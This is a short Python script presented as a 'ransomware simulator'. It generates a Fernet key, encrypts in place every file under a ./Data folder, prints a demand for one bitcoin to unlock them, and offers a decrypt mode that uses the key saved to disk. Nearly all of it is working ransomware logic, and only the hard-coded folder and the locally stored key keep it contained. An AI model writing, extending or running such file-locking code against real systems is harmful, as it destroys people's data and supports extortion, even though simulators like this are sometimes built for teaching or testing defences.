import os
from cryptography.fernet import Fernet

target_folder = "./Data"


def key_generator():
    key = Fernet.generate_key()
    with open("the_key.key", "wb") as theKey:
        theKey.write(key)
    return key


def load_key():
    return open("the_key.key", "rb").read()


def encrypt_files(key):
    f = Fernet(key)
    print(f"[*] ATTACK STARTED on: {target_folder}")

    for root, dir, files in os.walk(target_folder):
        for file in files:
            if file == "chaosEngine.py" or file == "the_key.key":
                continue
            filePath = os.path.join(root, file)
            print(f" -> Locking: {filePath}")

            with open(filePath, "rb") as originalFile:
                originalData = originalFile.read()

            ecryptedData = f.encrypt(originalData)

            with open(filePath, "wb") as encryptedFile:
                encryptedFile.write(ecryptedData)
    print("[*] ENCRYPTION COMPLETE. FILES ARE GONE.")


def decrypt_files(key):
    f = Fernet(key)
    print("[*] RECOVERY STARTED...")

    for root, dir, files in os.walk(target_folder):
        for file in files:
            if file == "chaosEngine.py" or file == "the_key.key":
                continue
            filePath = os.path.join(root, file)

            try:
                with open(filePath, "rb") as encryptedFile:
                    encryptedData = encryptedFile.read()

                decryptData = f.decrypt(encryptedData)

                with open(filePath, "wb") as decryptedFile:
                    decryptedFile.write(decryptData)

                print(f" -> Restored: {filePath}")

            except Exception:
                print(f" [!] FAILED to decrypt: {filePath} (Wrong Key?)")
    print("[*] DECRYPTION COMPLETE. FILES ARE BACK.")


print("--- RANSOMWARE SIMULATOR ---")
user_action = input("Select Mode: \n1. LOCK (Encrypt)\n2. UNLOCK (Decrypt)\n> ")

if user_action == "1":
    # Generate a new key and Lock everything
    secret_key = key_generator()
    encrypt_files(secret_key)
    print("\n[!!!] ALL FILES ENCRYPTED. SEND 1 BITCOIN TO UNLOCK. [!!!]")

elif user_action == "2":
    # Read the key and Unlock
    if os.path.exists("the_key.key"):
        secret_key = load_key()
        decrypt_files(secret_key)
    else:
        print("NO KEY FOUND. YOU ARE DOOMED.")
